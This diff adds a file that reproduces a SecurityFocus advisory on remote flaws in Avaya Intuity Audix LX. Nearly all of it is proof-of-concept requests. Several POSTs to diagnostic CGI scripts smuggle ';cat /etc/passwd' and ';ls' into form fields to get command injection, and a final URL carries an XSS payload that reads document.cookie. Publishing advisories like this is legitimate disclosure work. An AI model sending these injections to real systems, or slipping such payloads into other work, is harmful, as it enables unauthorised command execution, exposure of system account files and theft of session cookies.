@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/36450/info
+
+Avaya Intuity Audix LX is prone to multiple remote vulnerabilities, including:
+
+1. Multiple remote command-execution vulnerabilities
+2. A cross-site request-forgery vulnerability
+3. A cross-site scripting vulnerability
+
+Attackers can exploit these issues to execute arbitrary commands with the privileges of 'vexvm' on the underlying system, steal cookie-based authentication credentials, execute arbitrary script code, and perform administrative tasks. Other attacks are also possible. 
+
+POST /cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=127.0.0.1;cat+/etc/passwd&count_p=1&size_p=56
+
+POST https://www.example.com/cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=;cat+/etc/passwd
+
+POST /cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=&count_p=1;ls&size_p=56
+
+POST /cswebadm/diag/cgi-bin/sendrec.pl HTTP/1.1
+ipadd=&count_p=1&size_p=56&opt_n=;ls
+
+POST /cswebadm/diag/cgi-bin/nslookup.pl HTTP/1.1
+host_or_ip=127.0.0.1&r_type=;ls;
+
+https://www.example.com/cgi-bin/smallmenu.pl?url=%3C/
+title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
